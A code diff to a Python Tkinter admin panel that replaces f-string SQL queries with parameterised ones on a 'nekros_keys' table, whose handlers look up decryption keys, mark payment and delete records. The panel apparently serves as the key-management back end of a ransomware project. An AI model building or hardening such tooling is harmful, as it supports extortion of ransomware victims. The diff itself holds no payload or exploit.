@@ -273,8 +273,8 @@ class Toplevel1:
         try:
             mydb = mysql.connector.connect(host=self.server, user=self.username, passwd=self.password, database=self.db_name)
             mycursor = mydb.cursor()
-            request = f"DELETE FROM nekros_keys WHERE software_key=\'{self.Entry1.get()}\'"
-            mycursor.execute(request)
+            request = "DELETE FROM nekros_keys WHERE software_key=%s"
+            mycursor.execute(request, (self.Entry1.get(),))
             self.Label7.configure(text='''Selected Record Deleted Successful''')
         except Exception:
             self.Label7.configure(text='''Unable to Retrive Decryption Key!''') 
@@ -283,7 +283,7 @@ class Toplevel1:
         try:
             mydb = mysql.connector.connect(host=self.server, user=self.username, passwd=self.password, database=self.db_name)
             mycursor = mydb.cursor()
-            request = f"DELETE FROM nekros_keys"
+            request = "DELETE FROM nekros_keys"
             mycursor.execute(request)
             self.Label7.configure(text='''!!! All Record Deleted Successful !!!''')
         except Exception:
@@ -293,8 +293,8 @@ class Toplevel1:
         try:
             mydb = mysql.connector.connect(host=self.server, user=self.username, passwd=self.password, database=self.db_name)
             mycursor = mydb.cursor()
-            request = f"select decrypt_key from nekros_keys WHERE software_key=\'{self.Entry1.get()}\'"
-            mycursor.execute(request)
+            request = "SELECT decrypt_key FROM nekros_keys WHERE software_key=%s"
+            mycursor.execute(request, (self.Entry1.get(),))
             result_of_result = mycursor.fetchone()
             self.Label7.configure(text='RESULT : '+ str(result_of_result[0]))
         except Exception:
@@ -304,8 +304,8 @@ class Toplevel1:
         try:
             mydb = mysql.connector.connect(host=self.server, user=self.username, passwd=self.password, database=self.db_name)
             mycursor = mydb.cursor()
-            request = f"update nekros_keys set payment=True WHERE software_key=\'{self.Entry1.get()}\'"
-            mycursor.execute(request)
+            request = "UPDATE nekros_keys SET payment=True WHERE software_key=%s"
+            mycursor.execute(request, (self.Entry1.get(),))
             self.Label7.configure(text='''Database Updated Successfully!''')
         except Exception:
             self.Label7.configure(text='''Unable to Update record!''')        
